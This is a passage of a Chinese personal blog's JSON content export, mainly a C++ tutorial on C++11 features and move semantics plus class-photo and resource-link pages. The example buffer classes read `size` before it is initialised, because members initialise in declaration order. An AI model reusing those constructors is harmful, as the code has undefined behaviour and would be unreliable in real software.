{"meta":{"title":"Uniqueland","subtitle":"--XsRan's Personal Blog","description":"","author":"XsRan","url":"http://uniqueland.top","root":"/"},"pages":[{"title":"来了","date":"2020-11-09T14:06:06.735Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/ToXiaowei.html","permalink":"http://uniqueland.top/Eastereggs/ToXiaowei.html","excerpt":"","text":"http://uniqueland.top/Eastereggs/Class17"},{"title":"Categories","date":"2020-05-10T05:33:34.000Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"categories/index.html","permalink":"http://uniqueland.top/categories/index.html","excerpt":"","text":""},{"title":"sitemap","date":"2020-05-10T05:34:11.000Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Sitemap/index.html","permalink":"http://uniqueland.top/Sitemap/index.html","excerpt":"","text":""},{"title":"关于","date":"2020-05-10T05:33:14.000Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"about/index.html","permalink":"http://uniqueland.top/about/index.html","excerpt":"","text":"第一次搭建网站也不知道在“关于”版块写什么，就留个微信吧，有路过的想交个朋友的可以加微信交流一下。微信ID：KID3317"},{"title":"Schedule","date":"2020-05-10T05:33:53.000Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"schedule/index.html","permalink":"http://uniqueland.top/schedule/index.html","excerpt":"","text":""},{"title":"","date":"2021-04-24T14:21:13.884Z","updated":"2021-04-24T14:21:13.884Z","comments":true,"path":"hidden/resources.html","permalink":"http://uniqueland.top/hidden/resources.html","excerpt":"","text":"图片类 Wallhaven Pixabay Pngimg Pexels Unsplash Foodies 音效类 爱给网 字体类 字体天下 猫啃网 求字体 字由 100font 可商用字体查询 影视类 真不卡影视 独播库 91美剧网 色彩类 colorhunt Coolors Palettable PPT类 PPT宝藏 PPT超级市场 优品PPT 图标类 阿里巴巴矢量图标库 Iconstore 插画制作工具 视频类 Videezy Videvo Mixkit Distill 蓝光网 综合类 Anyknew Topbook"},{"title":"","date":"2022-03-26T11:52:57.162Z","updated":"2022-03-26T11:52:57.162Z","comments":true,"path":"hidden/ctf_resources.html","permalink":"http://uniqueland.top/hidden/ctf_resources.html","excerpt":"","text":"理论知识 CTFHUB 看雪知识库 CheatSheet CTF-WIKI 先知社区 安全客 洞悉漏洞 先知社区_XXE Freebuf_Web 实践平台 BUUCTF 攻防世界 Bugku 二进制_cy 综合 来自xPoint学长的分享"},{"title":"所有标签","date":"2021-11-07T15:49:01.532Z","updated":"2020-11-28T16:21:57.445Z","comments":true,"path":"tags/index.html","permalink":"http://uniqueland.top/tags/index.html","excerpt":"","text":""},{"title":"彩蛋","date":"2020-11-09T14:06:06.755Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Drafts/Class17.html","permalink":"http://uniqueland.top/Eastereggs/Drafts/Class17.html","excerpt":"","text":"FBI WARNING!非十七班同学请退出网页！(虽然说其他人也进不来) 由于展示图片较多，建议等待十秒再浏览，效果更佳。 镇楼 百日誓师 高二运动会 高三运动会 个人特写 彩蛋中的彩蛋 日常 高一 合照 待办事项收集毕业照打包图片，放链接征集网页文案制作子网……算了我好懒…关于水印由于原先使用的图床出现了bug，导致部分图片加载错误，故不得不借用微博作为图床。关于图片整合包由于图片数量较多，故只挑选了一些较具有代表性的发布。后续会有网盘链接。变更记录changelog2020.05.25 首次部署2020.05.27 更换主题2020.05.28 部署过程出现错误，重装系统2020.06.01 贴图图床出现问题，更换图床2020.06.14 图床再次出现问题，使用微博作为临时图床，补充图片"},{"title":"彩蛋","date":"2020-11-10T03:26:46.695Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Class17.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Class17.html","excerpt":"","text":"FBI WARNING!非十七班同学请退出网页！(虽然说其他人也进不来) ,注意：此链接为内部链接，没有链接的人进不来，无需担心隐私泄漏。 镇楼百日誓师高二运动会高三运动会个人特写彩蛋中的彩蛋日常高一合照 关于个人照片如有因各种原因而不愿意展示图片的同学请与我联系如有想添加图片的同学也请与我联系，乐意至极待办事项收集毕业照打包图片，放链接征集网页文案制作子网……算了我好懒…终究还是逃不过制作子网页… 由于先前只有一个网页，故图片展示数量有限。现在…增加子网页的图片由于图床原因故待排版关于水印由于原先使用的图床出现了bug，导致部分图片加载错误，故不得不借用微博作为图床。关于图片整合包由于图片数量较多，故只挑选了一些较具有代表性的发布。后续会有网盘链接。变更记录changelog首次部署更换主题部署过程出现错误，重装系统贴图图床出现问题，更换图床图床再次出现问题，使用微博作为临时图床，补充图片由于图片过多，不得不分为数个子网页…图床再再再次出现问题，所有网页 推 倒 重 做再次排版添加图片，略作排版"},{"title":"彩蛋中的彩蛋","date":"2020-11-09T14:06:06.748Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Eastereggs.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Eastereggs.html","excerpt":"","text":"日常"},{"title":"个人特写","date":"2020-11-10T05:16:37.169Z","updated":"2020-11-10T05:16:37.168Z","comments":true,"path":"Eastereggs/Class17/Closeup.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Closeup.html","excerpt":"","text":"感谢高中有你们 (谁有珠姐和马老师的照片提供一下嘛…凑齐召唤神龙) 彩蛋中的彩蛋"},{"title":"高一","date":"2020-11-09T14:06:06.751Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Grade1.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Grade1.html","excerpt":"","text":"合照"},{"title":"高二运动会","date":"2020-11-09T14:06:06.743Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Grade2.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Grade2.html","excerpt":"","text":"!s 高三运动会"},{"title":"高三运动会","date":"2020-11-09T14:06:06.745Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Grade3.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Grade3.html","excerpt":"","text":"个人特写"},{"title":"日常","date":"2020-11-09T14:06:06.750Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Routine.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Routine.html","excerpt":"","text":"高一"},{"title":"镇楼","date":"2020-11-09T14:06:06.741Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Starting.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Starting.html","excerpt":"","text":"百日誓师"},{"title":"","date":"2020-11-10T02:28:15.625Z","updated":"2020-09-28T11:51:06.000Z","comments":true,"path":"Eastereggs/JNU2020/记暨大新训.html","permalink":"http://uniqueland.top/Eastereggs/JNU2020/%E8%AE%B0%E6%9A%A8%E5%A4%A7%E6%96%B0%E8%AE%AD.html","excerpt":"","text":"记暨大新训帅气昊哥在线演唱 随拍 在线征集文案…"},{"title":"成人礼 & 誓师","date":"2020-11-09T14:06:06.742Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Oath.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Oath.html","excerpt":"","text":"高二运动会"},{"title":"合照","date":"2020-11-10T05:15:55.270Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Groupphotos.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Groupphotos.html","excerpt":"","text":"聚是一团火，散是满天星。十七班的各位兄弟姐妹们，我们有缘，江湖再见！ 返回"}],"posts":[{"title":"Chapter 1 C++ Tutorial 简介","slug":"Cpp_tutorial_Chapter_1","date":"2025-04-30T15:45:16.318Z","updated":"2025-04-30T16:01:36.514Z","comments":true,"path":"2025/04/30/Cpp_tutorial_Chapter_1/","link":"","permalink":"http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_1/","excerpt":"","text":"本系列是参考《C++ Primer Plus》目录进行编写的精简版教程。 由于是精简版，因此可能不能完全覆盖原版《C++ Primer Plus》的所有内容，但是在篇幅上大大减少，只能说有利有弊吧。 对于编写代码的环境，个人建议是使用wsl2（推荐）或者VMWare等虚拟机环境中Linux自带的g++编译器（使用mingw等编译工具有可能会出现各种奇奇怪怪的错误），常见的编译命令如下： 1g++ test.cpp -o test 编译完成后，执行命令./test即可运行编译后的程序。 当然，也可以省略-o test，直接使用g++ test.cpp编译，编译完成后会生成一个默认的可执行文件a.out，执行命令./a.out即可运行编译后的程序。 文章未经许可禁止转载。如有问题请发送邮件至xsran12138@163.com。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 18 探讨C++新标准","slug":"Cpp_tutorial_Chapter_18","date":"2025-04-30T15:42:24.030Z","updated":"2025-04-30T15:41:03.856Z","comments":true,"path":"2025/04/30/Cpp_tutorial_Chapter_18/","link":"","permalink":"http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_18/","excerpt":"","text":"18.1 复习前面介绍过的C++11功能C++11 标准为 C++ 语言带来了许多重要的改进和新特性，旨在提高语言的效率、安全性和易用性。在前面的章节中，我们已经接触并使用了其中的一些功能。本节将对这些已介绍的 C++11 特性进行一个简要的回顾。 18.1.1 新类型C++11 引入了几种新的基本类型： long long 和 unsigned long long: （第 3 章）提供了至少 64 位的整数类型，用于表示比 long 更大范围的整数。 12long long large_num = 9876543210123LL;unsigned long long very_large_positive = 18446744073709551615ULL; char16_t 和 char32_t: （第 3 章, 第 16 章）用于显式支持 UTF-16 和 UTF-32 编码的字符。分别使用 u 和 U 前缀表示对应的字符和字符串字面量。 1234char16_t utf16_char = u&#x27;Ω&#x27;;char32_t utf32_char = U&#x27;🌍&#x27;;const char16_t* utf16_str = u&quot;你好&quot;;const char32_t* utf32_str = U&quot;世界&quot;; nullptr: （第 4 章）引入了新的空指针常量 nullptr，用于替代之前使用的 0 或 NULL。nullptr 具有明确的指针类型 (std::nullptr_t)，可以避免一些与 0 (整数) 相关的歧义。 1234int* ptr1 = nullptr;void (*func_ptr)(int) = nullptr;// if (ptr1 == 0) &#123; /* ... */ &#125; // 旧式比较if (ptr1 == nullptr) &#123; /* ... */ &#125; // C++11 推荐 18.1.2 统一的初始化C++11 推广了使用花括号 &#123;&#125; 进行初始化的方式，称为统一初始化 (Uniform Initialization) 或列表初始化 (List Initialization)。这种方式可以用于多种初始化场景，并有助于防止窄化转换 (Narrowing Conversion)。 基本类型: 123int x&#123;5&#125;;double pi&#123;3.14&#125;;// int narrow_error&#123;3.14&#125;; // 编译错误！防止 double 到 int 的窄化 数组: 1int arr[]&#123;1, 2, 3, 4, 5&#125;; // 大小自动推断 结构和类: 1234struct Point &#123; int x, y; &#125;;Point p&#123;10, 20&#125;;std::string s&#123;&quot;Hello&quot;&#125;; STL 容器 (通过 initializer_list): （第 16 章） 12std::vector&lt;int&gt; v = &#123;1, 2, 3&#125;;std::map&lt;std::string, int&gt; m &#123;&#123;&quot;one&quot;, 1&#125;, &#123;&quot;two&quot;, 2&#125;&#125;; 18.1.3 声明C++11 引入了新的声明方式来简化类型书写和推断： auto: （第 3 章）让编译器根据变量的初始化表达式自动推断其类型。 1234auto i = 42; // i 推断为 intauto d = 3.14; // d 推断为 doubleauto s = std::string(&quot;text&quot;); // s 推断为 std::stringauto it = v.begin(); // it 推断为 std::vector&lt;int&gt;::iterator decltype: 根据表达式推断类型，但不计算该表达式。常用于泛型编程或需要根据已有变量或函数返回值确定类型的场景。 12345int x = 5;decltype(x) y = 10; // y 的类型与 x 相同，为 intdouble func();decltype(func()) z; // z 的类型是 func 的返回类型 double (不实际调用 func) 18.1.4 智能指针（第 16 章）C++11 在 &lt;memory&gt; 头文件中引入了现代智能指针，用于自动管理动态分配的内存，取代了容易出错的 auto_ptr。 std::unique_ptr&lt;T&gt;: 独占所有权的智能指针，轻量级，不可复制，可移动。 std::shared_ptr&lt;T&gt;: 共享所有权的智能指针，通过引用计数管理对象生命周期。 std::weak_ptr&lt;T&gt;: 非拥有型指针，用于观察 shared_ptr 管理的对象，解决循环引用问题。 18.1.5 异常规范方面的修改（第 15 章）C++11 引入了 noexcept 说明符和运算符，用于指示函数是否可能抛出异常。 noexcept 说明符: 放在函数声明或定义后，表示该函数保证不抛出任何异常。 1void process_data() noexcept; // 声明保证不抛异常 这有助于编译器进行优化，并用于异常安全保证。析构函数默认是 noexcept 的。 noexcept 运算符: noexcept(expression)，在编译时判断表达式 expression 是否可能抛出异常，返回一个 bool 常量。 旧的 throw() 异常规范在 C++11 中被废弃。 18.1.6 作用域内枚举（第 10 章）C++11 引入了强类型枚举 (Strongly-typed enums) 或**作用域内枚举 (Scoped enums)**，使用 enum class (或 enum struct) 关键字定义。 12345678910enum class Color &#123; RED, GREEN, BLUE &#125;;enum class Status &#123; OK, ERROR &#125;;Color c = Color::RED;Status s = Status::OK;// if (c == s) &#123;&#125; // 编译错误！不同类型的枚举不能直接比较// int x = c; // 编译错误！不能隐式转换为整数if (c == Color::GREEN) &#123; /* ... */ &#125; 优点: 强类型: 不同枚举类型的值不能隐式转换或直接比较。 作用域: 枚举成员的作用域限定在枚举类型内部，必须通过 EnumType::Member 访问，避免了命名冲突。 可指定底层类型: enum class Color : char &#123; RED, GREEN, BLUE &#125;; 18.1.7 对类的修改(本节主要回顾，但部分内容如委托/继承构造函数、override/final 在 18.3 详细介绍，这里仅提及概念)C++11 对类定义和使用也进行了一些改进，部分已在前面章节涉及或将在后续章节详细介绍，例如： 默认构造函数和成员初始化: 允许在类定义中直接初始化非静态成员变量。 = default 和 = delete: 显式要求编译器生成默认的特殊成员函数（构造、析构、拷贝、移动）或禁用它们。 委托构造函数: 一个构造函数可以调用同一类的另一个构造函数。 继承构造函数: 派生类可以继承基类的构造函数。 override 和 final: 用于管理虚函数，override 确保派生类方法确实覆盖了基类虚函数，final 阻止派生类进一步覆盖虚函数或阻止类被继承。 18.1.8 模板和 STL 方面的修改C++11 对模板和标准库进行了大量增强： 基于范围的 for 循环: （第 5 章, 第 16 章）提供了简洁的遍历容器或序列的方式。 1234std::vector&lt;int&gt; v = &#123;1, 2, 3&#125;;for (int x : v) &#123; std::cout &lt;&lt; x &lt;&lt; &quot; &quot;;&#125; std::array: （第 4 章, 第 16 章）提供了固定大小数组的模板类封装。 无序关联容器: （第 16 章）引入了基于哈希表的 unordered_set, unordered_map, unordered_multiset, unordered_multimap。 std::initializer_list: （第 16 章）使得容器和其他类能够支持使用 &#123;&#125; 进行列表初始化。 新的 STL 算法: 增加了一些新的算法（如 copy_if, move, shuffle 等）。 Lambda 表达式: （第 16 章简单使用，第 18.4 节详细介绍）允许就地定义匿名函数对象。 模板别名 (using): （第 14 章）提供了比 typedef 更清晰、更强大的为模板定义别名的方式。 12template&lt;typename T&gt;using Vec = std::vector&lt;T&gt;; // Vec&lt;int&gt; 等价于 std::vector&lt;int&gt; 18.1.9 右值引用(本节主要回顾，但右值引用和移动语义在 18.2 详细介绍，这里仅提及概念)C++11 引入了一个重要的底层概念——右值引用 (Rvalue Reference)**，使用 &amp;&amp; 表示。右值引用主要用于实现移动语义 (Move Semantics)** 和**完美转发 (Perfect Forwarding)**。移动语义允许资源（如动态分配的内存）从一个对象“移动”到另一个对象，而不是进行昂贵的复制，这对于优化涉及临时对象或资源转移的操作至关重要（例如 unique_ptr 的所有权转移，vector 增长时的元素移动）。移动语义将在 18.2 节详细探讨。 这些 C++11 特性共同使得 C++ 代码可以写得更现代、更安全、更高效。 18.2 移动语义和右值引用C++11 引入了右值引用 (Rvalue Reference) 和**移动语义 (Move Semantics)**，这是 C++11 最重要的特性之一，旨在提高性能，特别是对于管理资源的类（如动态分配内存、文件句柄、网络连接等）。 18.2.1 为何需要移动语义考虑一个管理动态内存的类，例如一个简单的字符串类或一个持有大缓冲区的类。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;#include &lt;cstring&gt; // for strlen, strcpy#include &lt;utility&gt; // for std::swapclass LegacyBuffer &#123;private: char* buffer; size_t size;public: // Constructor LegacyBuffer(const char* s = &quot;&quot;) : size(std::strlen(s)), buffer(new char[size + 1]) &#123; std::cout &lt;&lt; &quot;Constructor called for &#x27;&quot; &lt;&lt; s &lt;&lt; &quot;&#x27;\\n&quot;; std::strcpy(buffer, s); &#125; // Destructor ~LegacyBuffer() &#123; std::cout &lt;&lt; &quot;Destructor called for buffer at &quot; &lt;&lt; (void*)buffer &lt;&lt; &quot;\\n&quot;; delete[] buffer; &#125; // Copy Constructor (Deep Copy) LegacyBuffer(const LegacyBuffer&amp; other) : size(other.size), buffer(new char[size + 1]) &#123; std::cout &lt;&lt; &quot;Copy Constructor called from &quot; &lt;&lt; (void*)other.buffer &lt;&lt; &quot; to &quot; &lt;&lt; (void*)buffer &lt;&lt; &quot;\\n&quot;; std::strcpy(buffer, other.buffer); &#125; // Copy Assignment Operator (Deep Copy) LegacyBuffer&amp; operator=(const LegacyBuffer&amp; other) &#123; std::cout &lt;&lt; &quot;Copy Assignment called from &quot; &lt;&lt; (void*)other.buffer &lt;&lt; &quot; to &quot; &lt;&lt; (void*)buffer &lt;&lt; &quot;\\n&quot;; if (this == &amp;other) &#123; // Self-assignment check return *this; &#125; delete[] buffer; // Release old resource size = other.size; buffer = new char[size + 1]; // Allocate new resource std::strcpy(buffer, other.buffer); // Copy data return *this; &#125; void print() const &#123; std::cout &lt;&lt; &quot;Buffer content: &quot; &lt;&lt; (buffer ? buffer : &quot;null&quot;) &lt;&lt; std::endl; &#125; friend void swap(LegacyBuffer&amp; first, LegacyBuffer&amp; second) noexcept &#123; using std::swap; swap(first.size, second.size); swap(first.buffer, second.buffer); std::cout &lt;&lt; &quot;Buffer swapped via friend swap\\n&quot;; &#125;&#125;;LegacyBuffer createBuffer(const char* s) &#123; return LegacyBuffer(s); // 返回一个临时对象 (rvalue)&#125; 在 C++11 之前，当处理临时对象 (Temporary Objects) 或即将销毁的对象时，复制构造函数和复制赋值运算符会导致不必要的**深拷贝 (Deep Copy)**： 12345678910111213141516171819202122232425int main() &#123; LegacyBuffer b1(&quot;Original&quot;); std::cout &lt;&lt; &quot;------\\n&quot;; LegacyBuffer b2 = b1; // 调用复制构造函数 (深拷贝) - 合理，需要独立副本 std::cout &lt;&lt; &quot;------\\n&quot;; LegacyBuffer b3(&quot;Temporary Source&quot;); b1 = b3; // 调用复制赋值运算符 (深拷贝) - 合理 std::cout &lt;&lt; &quot;------\\n&quot;; // 问题所在：处理临时对象 LegacyBuffer b4 = createBuffer(&quot;Temporary&quot;); // 1. createBuffer 返回临时对象 // 2. 临时对象被 *复制* 到 b4 (调用复制构造函数) // 3. 临时对象被销毁 // (编译器优化 RVO/NRVO 可能消除这次复制，但概念上存在) std::cout &lt;&lt; &quot;------\\n&quot;; b1 = createBuffer(&quot;Another Temp&quot;); // 1. createBuffer 返回临时对象 // 2. 临时对象被 *复制* 赋值给 b1 (调用复制赋值) // 3. 临时对象被销毁 std::cout &lt;&lt; &quot;------\\n&quot;; return 0;&#125; 在处理 createBuffer 返回的临时对象时，我们实际上只是想把临时对象内部管理的资源（buffer 指针和 size）转移给新的对象 (b4 或 b1)，因为临时对象马上就要被销毁了，它的资源没用了。进行深拷贝（重新分配内存并复制内容）是一种浪费。 移动语义就是为了解决这个问题：允许我们“窃取”或“移动”来自临时对象或明确标记为可移动对象的资源，而不是复制它们。 右值引用 (&amp;&amp;)为了区分可以安全“窃取”资源的临时对象和不能窃取的持久对象（左值），C++11 引入了**右值引用 (Rvalue Reference)**，用 &amp;&amp; 表示。 左值 (Lvalue): 通常指那些有名字、可以取地址、在表达式结束后仍然存在的对象。例如，变量名 b1, b2。 右值 (Rvalue): 通常指那些临时的、没有名字、在表达式结束后即将销毁的值。例如，函数返回值 createBuffer(&quot;Temporary&quot;)，字面常量 10, &quot;Hello&quot;，算术表达式的结果 x + y。 左值引用 (&amp;): 只能绑定到左值。LegacyBuffer&amp; ref = b1; (OK), LegacyBuffer&amp; ref = createBuffer(&quot;Temp&quot;); (错误!)。 (const 左值引用 const LegacyBuffer&amp; 是个例外，它可以绑定到右值)。 右值引用 (&amp;&amp;): 只能绑定到右值。LegacyBuffer&amp;&amp; rref = createBuffer(&quot;Temp&quot;); (OK), LegacyBuffer&amp;&amp; rref = b1; (错误!)。 右值引用 &amp;&amp; 的引入使得我们可以重载函数（特别是构造函数和赋值运算符），让它们能够区分接收的是左值还是右值，从而对右值（临时对象）采取不同的、更高效的操作（移动）。 18.2.2 一个移动示例现在我们为 LegacyBuffer 类添加移动构造函数和移动赋值运算符。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;utility&gt; // for std::move and std::swapclass ModernBuffer &#123;private: char* buffer; size_t size;public: // Constructor ModernBuffer(const char* s = &quot;&quot;) : size(std::strlen(s)), buffer(new char[size + 1]) &#123; std::cout &lt;&lt; &quot;Constructor called for &#x27;&quot; &lt;&lt; s &lt;&lt; &quot;&#x27;\\n&quot;; std::strcpy(buffer, s); &#125; // Destructor ~ModernBuffer() &#123; std::cout &lt;&lt; &quot;Destructor called for buffer at &quot; &lt;&lt; (void*)buffer &lt;&lt; &quot;\\n&quot;; delete[] buffer; &#125; // Copy Constructor (Deep Copy) ModernBuffer(const ModernBuffer&amp; other) : size(other.size), buffer(new char[size + 1]) &#123; std::cout &lt;&lt; &quot;Copy Constructor called from &quot; &lt;&lt; (void*)other.buffer &lt;&lt; &quot; to &quot; &lt;&lt; (void*)buffer &lt;&lt; &quot;\\n&quot;; std::strcpy(buffer, other.buffer); &#125; // Copy Assignment Operator (Deep Copy) ModernBuffer&amp; operator=(const ModernBuffer&amp; other) &#123; std::cout &lt;&lt; &quot;Copy Assignment called from &quot; &lt;&lt; (void*)other.buffer &lt;&lt; &quot; to &quot; &lt;&lt; (void*)buffer &lt;&lt; &quot;\\n&quot;; if (this == &amp;other) &#123; return *this; &#125; // 使用 copy-and-swap idiom 更安全 ModernBuffer temp(other); // 调用复制构造 swap(*this, temp); // 交换资源 return *this; // 旧方式： // delete[] buffer; // size = other.size; // buffer = new char[size + 1]; // std::strcpy(buffer, other.buffer); // return *this; &#125; // *** Move Constructor (C++11) *** ModernBuffer(ModernBuffer&amp;&amp; other) noexcept // 接收右值引用，标记为 noexcept : size(other.size), buffer(other.buffer) // 1. 窃取资源 (浅拷贝指针和大小) &#123; std::cout &lt;&lt; &quot;Move Constructor called from &quot; &lt;&lt; (void*)other.buffer &lt;&lt; &quot; to &quot; &lt;&lt; (void*)buffer &lt;&lt; &quot;\\n&quot;; // 2. 将源对象置于有效但可析构的状态 (通常是置空) other.size = 0; other.buffer = nullptr; &#125; // *** Move Assignment Operator (C++11) *** ModernBuffer&amp; operator=(ModernBuffer&amp;&amp; other) noexcept // 接收右值引用，标记为 noexcept &#123; std::cout &lt;&lt; &quot;Move Assignment called from &quot; &lt;&lt; (void*)other.buffer &lt;&lt; &quot; to &quot; &lt;&lt; (void*)buffer &lt;&lt; &quot;\\n&quot;; if (this == &amp;other) &#123; // 自赋值检查 (虽然对右值不太可能，但保持良好习惯) return *this; &#125; // 1. 释放当前对象的资源 delete[] buffer; // 2. 窃取源对象的资源 size = other.size; buffer = other.buffer; // 3. 将源对象置于有效但可析构的状态 other.size = 0; other.buffer = nullptr; return *this; // 或者使用 swap: // swap(*this, other); // return *this; &#125; void print() const &#123; std::cout &lt;&lt; &quot;Buffer content: &quot; &lt;&lt; (buffer ? buffer : &quot;null&quot;) &lt;&lt; std::endl; &#125; friend void swap(ModernBuffer&amp; first, ModernBuffer&amp; second) noexcept &#123; using std::swap; swap(first.size, second.size); swap(first.buffer, second.buffer); std::cout &lt;&lt; &quot;Buffer swapped via friend swap\\n&quot;; &#125;&#125;;ModernBuffer createModernBuffer(const char* s) &#123; return ModernBuffer(s); // 返回临时对象 (rvalue)&#125;int main() &#123; ModernBuffer mb1(&quot;Original&quot;); std::cout &lt;&lt; &quot;------\\n&quot;; // 调用移动构造函数 (因为 createModernBuffer 返回右值) ModernBuffer mb2 = createModernBuffer(&quot;Temporary&quot;); std::cout &lt;&lt; &quot;------\\n&quot;; mb2.print(); std::cout &lt;&lt; &quot;------\\n&quot;; // 调用移动赋值运算符 (因为 createModernBuffer 返回右值) mb1 = createModernBuffer(&quot;Another Temp&quot;); std::cout &lt;&lt; &quot;------\\n&quot;; mb1.print(); std::cout &lt;&lt; &quot;------\\n&quot;; return 0;&#125; 现在，当用 createModernBuffer 返回的临时对象来初始化 mb2 或赋值给 mb1 时，会调用移动构造函数或移动赋值运算符。这些操作不再进行深拷贝，而是直接“窃取”临时对象的 buffer 指针，并将临时对象的指针置为 nullptr，避免了内存分配和数据复制，效率大大提高。 18.2.3 移动构造函数解析1234567ModernBuffer(ModernBuffer&amp;&amp; other) noexcept : size(other.size), buffer(other.buffer) // 1. 窃取资源&#123; // 2. 将源对象置空 other.size = 0; other.buffer = nullptr;&#125; 参数类型 ModernBuffer&amp;&amp; other: 接收一个右值引用，表示它只能绑定到右值（如临时对象）。 资源窃取: 构造函数通过初始化列表直接复制源对象 other 的指针 buffer 和大小 size。这是一个浅拷贝，非常快速。 置空源对象: 关键步骤！ 必须将源对象 other 的指针成员（buffer）设置为 nullptr（或其他有效但表示“空”状态的值）。这确保了当 other（临时对象）随后被析构时，它的析构函数 delete[] buffer; 不会释放已经被新对象“窃取”走的内存，从而避免了重复释放 (double free) 的错误。源对象必须被置于一个有效的、可析构的状态。 noexcept: 移动操作通常不应该抛出异常（因为它们主要涉及指针和基本类型的赋值）。将移动构造函数和移动赋值运算符标记为 noexcept 非常重要。这允许 STL 容器等在需要重新分配内存时（如 vector 增长）安全地移动元素而不是复制它们，从而获得显著的性能提升。如果移动操作可能抛异常，STL 通常会回退到使用（保证异常安全的）复制操作。 18.2.4 赋值移动赋值运算符的逻辑与移动构造函数类似： 123456789101112ModernBuffer&amp; operator=(ModernBuffer&amp;&amp; other) noexcept &#123; // ... 自赋值检查 ... // 1. 释放当前资源 delete[] buffer; // 2. 窃取源资源 size = other.size; buffer = other.buffer; // 3. 置空源对象 other.size = 0; other.buffer = nullptr; return *this;&#125; 它首先释放自己当前持有的资源，然后窃取源对象的资源，最后将源对象置空。使用 swap 实现通常更简洁且能自动处理自赋值和异常安全（如果 swap 是 noexcept 的话）。 18.2.5 强制移动 (std::move)移动构造函数和移动赋值运算符通常只对右值（如临时对象）起作用。但有时我们想从一个左值（有名字的对象）那里“窃取”资源，即使这个左值在之后还会存在（但我们明确知道不再需要它的资源了）。 例如，将一个大的 vector 的内容转移给另一个 vector： 123456789101112std::vector&lt;int&gt; source = &#123;1, 2, 3, 4, 5&#125;;std::vector&lt;int&gt; destination;// destination = source; // 这会调用复制赋值，复制所有元素// 我们想移动 source 的内容到 destination，即使 source 是左值// 使用 std::move() 将 source 强制转换为右值引用类型destination = std::move(source);// 现在，destination 拥有了原来的元素 &#123;1, 2, 3, 4, 5&#125;// source 的状态是有效的，但内容未指定 (通常为空)std::cout &lt;&lt; &quot;Source size after move: &quot; &lt;&lt; source.size() &lt;&lt; std::endl; // 通常输出 0 std::move (定义在 &lt;utility&gt;) 本身并不执行任何移动操作。它只是一个类型转换，它无条件地将其实参（无论是左值还是右值）转换为右值引用类型 (T&amp;&amp;)。 这个转换使得被转换的对象可以被绑定到接受右值引用的函数（如移动构造函数或移动赋值运算符），从而触发移动语义。 使用 std::move 的注意事项: 调用 std::move(x) 后，你不应该再对 x 的值做任何假设（除了它可以被安全地销毁或重新赋值）。它的资源可能已经被“偷走”了。 只在你确定不再需要源对象（左值）的资源，或者源对象本身就是临时的（虽然对临时对象用 std::move 通常是多余的）时，才使用 std::move。 移动语义和右值引用是 C++11 中实现资源高效转移的关键机制，对于编写高性能的 C++ 代码至关重要，尤其是在处理大型数据结构或管理系统资源时。 18.3 新的类功能C++11 不仅引入了移动语义，还对类的定义和使用方式进行了一些重要的增强，使得类的设计更加灵活和可控。 18.3.1 特殊的成员函数对于一个类，编译器在特定条件下可以自动生成一些特殊的成员函数： 默认构造函数 (Default Constructor): 如果你没有提供任何构造函数，编译器会生成一个。 析构函数 (Destructor): 如果你没有提供析构函数，编译器会生成一个。 复制构造函数 (Copy Constructor): 如果你没有提供复制构造函数，编译器会生成一个，执行逐成员复制。 复制赋值运算符 (Copy Assignment Operator): 如果你没有提供复制赋值运算符，编译器会生成一个，执行逐成员赋值。 移动构造函数 (Move Constructor) (C++11): 仅当没有显式声明任何复制操作（复制构造、复制赋值）且没有显式声明移动操作（移动构造、移动赋值）且没有显式声明析构函数时，编译器才会生成。它执行逐成员移动。 移动赋值运算符 (Move Assignment Operator) (C++11): 生成条件与移动构造函数类似。它执行逐成员移动。 规则总结 (Rule of Three/Five/Zero): Rule of Three (C++98): 如果你需要显式定义析构函数、复制构造函数或复制赋值运算符中的任何一个（通常是因为类管理了需要深拷贝或特殊清理的资源），那么你几乎肯定需要同时定义这三个。 Rule of Five (C++11): 如果你需要显式定义上述三个中的任何一个，或者显式定义了移动构造函数或移动赋值运算符，那么你应该考虑定义或删除 (delete) 所有五个（析构、复制构造、复制赋值、移动构造、移动赋值），以确保类的行为符合预期。因为显式定义任何一个复制/移动/析构函数都会阻止编译器自动生成移动操作。 Rule of Zero (现代 C++ 推荐): 尽量设计你的类，使其不需要自定义析构函数、复制/移动构造函数或复制/移动赋值运算符。这通常通过使用 RAII（资源获取即初始化）原则和依赖标准库组件（如智能指针 unique_ptr, shared_ptr 和容器 vector, 